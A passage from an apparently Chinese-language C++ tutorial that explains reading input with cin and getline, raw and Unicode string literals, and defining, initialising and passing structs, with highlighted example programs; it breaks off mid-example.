<code>cin</code> 读取<strong>一个单词</strong>（以空白符——空格、制表符、换行符分隔）到 <code>string</code> 对象中。它会自动跳过开头的空白符，然后在遇到下一个空白符时停止读取。</li><li><strong>读取整行 (<code>getline()</code>):</strong> 如果需要读取包含空格的整行文本，应该使用 <code>getline()</code> 函数（这是一个全局函数，不是 <code>string</code> 的成员函数）。<ul><li>  <code>getline(cin, str)</code>: 从 <code>cin</code> 读取一行（直到遇到换行符 <code>\n</code>），并将内容（不包括换行符）存储到 <code>string</code> 对象 <code>str</code> 中。</li><li>  <code>getline(cin, str, delimiter)</code>: 读取直到遇到指定的 <code>delimiter</code> 字符为止。</li></ul></li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> word1, word2;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> line;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Enter two words:&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输入 (cin &gt;&gt; 读取单词)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; word1 &gt;&gt; word2; <span class="comment">// 输入 &quot;Hello World&quot; (用空格隔开)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Word 1: &quot;</span> &lt;&lt; word1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Hello</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Word 2: &quot;</span> &lt;&lt; word2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 World</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清除输入缓冲区中可能残留的换行符 (cin &gt;&gt; 之后通常需要)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="number">10000</span>, <span class="string">&#x27;\n&#x27;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输入 (getline 读取整行)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a line of text: &quot;</span>;</span><br><span class="line">    getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, line); <span class="comment">// 输入 &quot;This is a test line.&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: \&quot;&quot;</span> &lt;&lt; line &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;This is a test line.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 在混合使用 <code>cin &gt;&gt;</code> 和 <code>getline(cin, ...)</code> 时要特别小心。<code>cin &gt;&gt;</code> 读取单词后，会将换行符留在输入缓冲区中。如果紧接着调用 <code>getline()</code>，它会立即读到这个换行符并认为读取结束，导致得到一个空字符串。通常需要在 <code>cin &gt;&gt;</code> 之后、<code>getline()</code> 之前清除缓冲区中的换行符，例如使用 <code>std::cin.ignore()</code>。</p><h3 id="4-3-5-其他形式的字符串字面值"><a href="#4-3-5-其他形式的字符串字面值" class="headerlink" title="4.3.5 其他形式的字符串字面值"></a>4.3.5 其他形式的字符串字面值</h3><p>C++11 引入了新的字符串字面值形式，提供了对不同字符编码（如 Unicode）的更好支持。</p><ol><li><p><strong>原始字符串字面值 (Raw String Literal):</strong></p><ul><li>  语法: <code>R&quot;delimiter(raw_characters)delimiter&quot;</code></li><li>  <code>delimiter</code> 是一个可选的、最多16个字符的序列（不能包含空格、括号、反斜杠）。</li><li>  <code>raw_characters</code> 是字符串内容，其中的反斜杠 <code>\</code> 和引号 <code>&quot;</code> 等特殊字符不会被转义，按原样解释。</li><li>  主要用于书写包含大量特殊字符的字符串，如正则表达式、文件路径、HTML/XML代码等，避免大量的反斜杠转义。</li><li>  示例: <code>R&quot;(C:\Program Files\)&quot;</code>, <code>R&quot;delimiter(String with &quot;quotes&quot; and \backslashes)delimiter&quot;</code></li></ul></li><li><p><strong>Unicode 字符串字面值:</strong></p><ul><li>  <code>u8&quot;string&quot;</code>: UTF-8 编码的字符串 (类型是 <code>const char[]</code>，但应存储在 <code>std::string</code> 或处理 UTF-8 的地方)。</li><li>  <code>u&quot;string&quot;</code>: UTF-16 编码的字符串 (类型是 <code>const char16_t[]</code>)。</li><li>  <code>U&quot;string&quot;</code>: UTF-32 编码的字符串 (类型是 <code>const char32_t[]</code>)。</li></ul></li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 原始字符串字面值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> path1 = <span class="string">&quot;C:\\Program Files\\My App\\&quot;</span>; <span class="comment">// 需要转义反斜杠</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> path2 = <span class="string">R&quot;(C:\Program Files\My App\)&quot;</span>; <span class="comment">// 使用原始字符串，无需转义</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> regex = <span class="string">R&quot;(\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&#123;2,&#125;\b)&quot;</span>; <span class="comment">// 正则表达式</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> html = <span class="string">R&quot;delimiter(</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;&lt;title&gt;Raw String&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;&lt;p&gt;&quot;Hello!&quot;&lt;/p&gt;&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;)delimiter&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Path 1: &quot;</span> &lt;&lt; path1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Path 2: &quot;</span> &lt;&lt; path2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Regex: &quot;</span> &lt;&lt; regex &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;HTML:\n&quot;</span> &lt;&lt; html &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Unicode 字符串字面值 (主要用于需要特定编码的场景)</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* utf8_str = <span class="string">u8&quot;你好，世界&quot;</span>; <span class="comment">// UTF-8 (需要支持 UTF-8 的环境/终端才能正确显示)</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char16_t</span>* utf16_str = <span class="string">u&quot;你好，世界&quot;</span>; <span class="comment">// UTF-16</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char32_t</span>* utf32_str = <span class="string">U&quot;你好，世界&quot;</span>; <span class="comment">// UTF-32</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;UTF-8 String (may not display correctly): &quot;</span> &lt;&lt; utf8_str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理和打印 UTF-16/32 通常需要专门的库或函数</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; utf16_str; // 不能直接用 cout 打印 char16_t* / char32_t*</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原始字符串字面值在处理包含特殊字符的文本时非常方便。Unicode 字符串字面值则为处理国际化文本提供了标准化的基础。</p><h2 id="4-4-结构简介"><a href="#4-4-结构简介" class="headerlink" title="4.4 结构简介"></a>4.4 结构简介</h2><p>数组允许我们存储多个<strong>相同类型</strong>的数据。但有时我们需要将<strong>不同类型</strong>的数据组合成一个单一的、有意义的单元。例如，描述一件商品可能需要商品名称（字符串）、数量（整数）和单价（浮点数）。C++ 的<strong>结构 (Structure)</strong> 就提供了这种能力。</p><p>结构是一种用户定义的<strong>复合类型</strong>，它允许将多个不同类型的数据项（称为<strong>成员 (member)</strong> 或**字段 (field)**）捆绑在一起，形成一个新的数据类型。</p><h3 id="4-4-1-在程序中使用结构"><a href="#4-4-1-在程序中使用结构" class="headerlink" title="4.4.1 在程序中使用结构"></a>4.4.1 在程序中使用结构</h3><p>使用结构通常涉及以下步骤：</p><ol><li> <strong>定义结构:</strong> 使用 <code>struct</code> 关键字定义一个新的结构类型，并在花括号 <code>&#123;&#125;</code> 内声明其成员。结构定义通常放在 <code>main()</code> 函数之前或单独的头文件中。</li><li> <strong>声明结构变量:</strong> 使用定义好的结构类型名来声明变量。</li><li> <strong>访问结构成员:</strong> 使用<strong>成员运算符</strong>（点运算符 <code>.</code>) 来访问结构变量的特定成员。</li></ol><p><strong>结构定义语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">StructureName</span> &#123;</span></span><br><span class="line">    memberType1 memberName1;</span><br><span class="line">    memberType2 memberName2;</span><br><span class="line">    <span class="comment">// ... more members</span></span><br><span class="line">&#125;; <span class="comment">// 注意定义末尾的分号</span></span><br></pre></td></tr></table></figure><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // 为了使用 string</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 定义结构: 描述充气产品的结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Inflatable</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name; <span class="comment">// 商品名称 (string 类型成员)</span></span><br><span class="line">    <span class="keyword">float</span> volume;     <span class="comment">// 体积 (float 类型成员)</span></span><br><span class="line">    <span class="keyword">double</span> price;     <span class="comment">// 价格 (double 类型成员)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 2. 声明结构变量</span></span><br><span class="line">    Inflatable product1; <span class="comment">// 声明一个 Inflatable 类型的变量 product1</span></span><br><span class="line">    Inflatable product2; <span class="comment">// 声明另一个 Inflatable 类型的变量 product2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 访问并赋值结构成员</span></span><br><span class="line">    product1.name = <span class="string">&quot;Awesome Air Mattress&quot;</span>;</span><br><span class="line">    product1.volume = <span class="number">1.8f</span>;</span><br><span class="line">    product1.price = <span class="number">49.99</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以在声明时进行初始化 (C++98/03 风格，需要按顺序)</span></span><br><span class="line">    Inflatable product3 = &#123;<span class="string">&quot;Giant Swan Floatie&quot;</span>, <span class="number">2.5f</span>, <span class="number">79.95</span>&#125;; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问并输出成员</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product 1 Name: &quot;</span> &lt;&lt; product1.name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product 1 Price: $&quot;</span> &lt;&lt; product1.price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product 3 Name: &quot;</span> &lt;&lt; product3.name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product 3 Volume: &quot;</span> &lt;&lt; product3.volume &lt;&lt; <span class="string">&quot; cubic meters&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结构变量之间可以直接赋值 (成员逐个复制)</span></span><br><span class="line">    product2 = product1; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product 2 Name (after assignment): &quot;</span> &lt;&lt; product2.name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>struct Inflatable &#123; ... &#125;;</code>: 定义了一个名为 <code>Inflatable</code> 的新类型。</li><li>  <code>Inflatable product1;</code>: 创建了一个 <code>Inflatable</code> 类型的变量（对象）。</li><li>  <code>product1.name = ...;</code>: 使用点运算符访问 <code>product1</code> 的 <code>name</code> 成员并赋值。</li></ul><h3 id="4-4-2-C-11结构初始化"><a href="#4-4-2-C-11结构初始化" class="headerlink" title="4.4.2 C++11结构初始化"></a>4.4.2 C++11结构初始化</h3><p>C++11 引入的列表初始化（花括号初始化）也适用于结构体，提供了更灵活、更安全的初始化方式。</p><p><strong>特点:</strong></p><ol><li> <strong>可以省略等号 <code>=</code>:</strong> 与数组类似，可以在初始化时省略等号。</li><li> <strong>可以按成员顺序初始化:</strong> <code>StructType var &#123;value1, value2, ...&#125;;</code></li><li> <strong>可以初始化部分成员 (C++20 designated initializers):</strong> C++20 允许通过指定成员名进行初始化，可以不按顺序或只初始化部分成员。但在 C++11/14/17 中，通常需要按顺序提供值。</li><li> <strong>空花括号初始化:</strong> <code>StructType var &#123;&#125;;</code> 会将所有成员进行<strong>零初始化</strong>（数值类型为0，指针为 <code>nullptr</code>，<code>bool</code> 为 <code>false</code>，类类型会调用默认构造函数）。</li><li> <strong>禁止缩窄转换:</strong> 与数组一样，列表初始化不允许可能丢失信息的缩窄转换。</li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Product</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> id;</span><br><span class="line">    <span class="keyword">int</span> quantity;</span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// C++11 列表初始化 (省略等号)</span></span><br><span class="line">    Product item1 &#123; <span class="string">&quot;A123&quot;</span>, <span class="number">50</span>, <span class="number">19.95</span> &#125;; <span class="comment">// 按顺序初始化所有成员</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 省略等号，部分初始化 (C++11/14/17 中，未提供的成员会被值初始化/零初始化)</span></span><br><span class="line">    <span class="comment">// 注意：这种部分初始化对于包含 std::string 等类类型成员时，行为依赖于这些类的默认构造函数</span></span><br><span class="line">    <span class="comment">// Product item2 &#123; &quot;B456&quot;, 100 &#125;; // price 会被零初始化为 0.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 空花括号进行零初始化</span></span><br><span class="line">    Product item3 &#123;&#125;; <span class="comment">// id 为空字符串, quantity 为 0, price 为 0.0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Item 1 ID: &quot;</span> &lt;&lt; item1.id &lt;&lt; <span class="string">&quot;, Qty: &quot;</span> &lt;&lt; item1.quantity &lt;&lt; <span class="string">&quot;, Price: &quot;</span> &lt;&lt; item1.price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Item 2 ID: &quot; &lt;&lt; item2.id &lt;&lt; &quot;, Qty: &quot; &lt;&lt; item2.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item2.price &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Item 3 ID: \&quot;&quot;</span> &lt;&lt; item3.id &lt;&lt; <span class="string">&quot;\&quot;, Qty: &quot;</span> &lt;&lt; item3.quantity &lt;&lt; <span class="string">&quot;, Price: &quot;</span> &lt;&lt; item3.price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 禁止缩窄转换</span></span><br><span class="line">    <span class="comment">// Product item_error &#123; &quot;C789&quot;, 10.5, 25.0 &#125;; // 错误! 10.5 (double) 到 int 是缩窄转换</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++20 Designated Initializers (如果编译器支持 C++20)</span></span><br><span class="line">    <span class="comment">// Product item4 &#123; .id = &quot;D001&quot;, .price = 99.99 &#125;; // quantity 会被零初始化</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Item 4 ID: &quot; &lt;&lt; item4.id &lt;&lt; &quot;, Qty: &quot; &lt;&lt; item4.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item4.price &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-4-3-结构可以将string类作为成员吗"><a href="#4-4-3-结构可以将string类作为成员吗" class="headerlink" title="4.4.3 结构可以将string类作为成员吗"></a>4.4.3 结构可以将string类作为成员吗</h3><p><strong>是的，绝对可以。</strong> 正如在 <code>4.4.1</code> 和 <code>4.4.2</code> 的示例中看到的 (<code>Inflatable</code> 和 <code>Product</code> 结构)，<code>std::string</code> 对象可以像 <code>int</code>、<code>double</code> 或其他任何类型一样作为结构的成员。</p><p>这使得结构能够方便地包含文本信息，并利用 <code>string</code> 类提供的所有功能（自动内存管理、拼接、查找等）。</p><p><strong>示例回顾:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name; <span class="comment">// string 成员</span></span><br><span class="line">    <span class="keyword">int</span> studentID;</span><br><span class="line">    <span class="keyword">double</span> gpa;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Student s1 &#123; <span class="string">&quot;Alice Wonderland&quot;</span>, <span class="number">12345</span>, <span class="number">3.8</span> &#125;;</span><br><span class="line">    Student s2;</span><br><span class="line">    s2.name = <span class="string">&quot;Bob The Builder&quot;</span>; <span class="comment">// 可以像普通 string 一样操作</span></span><br><span class="line">    s2.studentID = <span class="number">67890</span>;</span><br><span class="line">    s2.gpa = <span class="number">3.5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; s1.name &lt;&lt; <span class="string">&quot; has GPA: &quot;</span> &lt;&lt; s1.gpa &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; s2.name &lt;&lt; <span class="string">&quot; has ID: &quot;</span> &lt;&lt; s2.studentID &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-4-4-其他结构属性"><a href="#4-4-4-其他结构属性" class="headerlink" title="4.4.4 其他结构属性"></a>4.4.4 其他结构属性</h3><p>结构在 C++ 中具有一些方便的属性：</p><ol><li><strong>赋值 (Assignment):</strong> 可以使用赋值运算符 <code>=</code> 将一个结构变量的值赋给同类型的另一个结构变量。这会执行**成员逐一复制 (memberwise copy)**，即将源结构每个成员的值复制到目标结构对应成员中。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Student s1 = &#123;<span class="string">&quot;Charlie&quot;</span>, <span class="number">111</span>, <span class="number">3.9</span>&#125;;</span><br><span class="line">Student s2;</span><br><span class="line">s2 = s1; <span class="comment">// s2 的 name, studentID, gpa 都被设置为 s1 的值</span></span><br></pre></td></tr></table></figure></li><li><strong>作为函数参数 (Pass by Value):</strong> 可以将结构变量按值传递给函数。函数会收到结构的一个副本，对副本成员的修改不会影响原始结构变量。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">displayStudent</span><span class="params">(Student s)</span> </span>&#123; <span class="comment">// s 是传入结构的一个副本</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ID: &quot;</span> &lt;&lt; s.studentID &lt;&lt; <span class="string">&quot;, Name: &quot;</span> &lt;&lt; s.name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    s.name = <span class="string">&quot;Changed&quot;</span>; <span class="comment">// 只修改副本</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">displayStudent(s1); <span class="comment">// 传递 s1 的副本</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; s1.name; <span class="comment">// 输出 &quot;Charlie&quot;，未被改变</span></span><br></pre></td></tr></table></figure></li><li><strong>作为函数参数 (Pass by Reference/Pointer):</strong> 为了避免复制整个结构的开销，或者需要在函数中修改原始结构，通常按引用或指针传递结构。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">updateGPA</span><span class="params">(Student&amp; s, <span class="keyword">double</span> newGPA)</span> </span>&#123; <span class="comment">// 按引用传递，可以修改原始结构</span></span><br><span class="line">    s.gpa = newGPA;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printID</span><span class="params">(<span class="keyword">const</span> Student* sPtr)</span> </span>&#123; <span class="comment">// 按指针传递 (const 防止意外修改)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ID: &quot;</span> &lt;&lt; sPtr-&gt;studentID &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 使用 -&gt; 访问指针指向的结构成员</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">updateGPA(s1, <span class="number">4.0</span>); <span class="comment">// 修改原始 s1</span></span><br><span class="line">printID(&amp;s1);       <span class="comment">// 传递 s1 的地址</span></span><br></pre></td></tr></table></figure></li><li><strong>作为函数返回值:</strong> 函数可以返回一个结构。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Student <span class="title">createStudent</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> name, <span class="keyword">int</span> id, <span class="keyword">double</span> gpa)</span> </span>&#123;</span><br><span class="line">    Student temp;</span><br><span class="line">    temp.name = name;</span><br><span class="line">    temp.studentID = id;</span><br><span class="line">    temp.gpa = gpa;</span><br><span class="line">    <span class="keyword">return</span> temp; <span class="comment">// 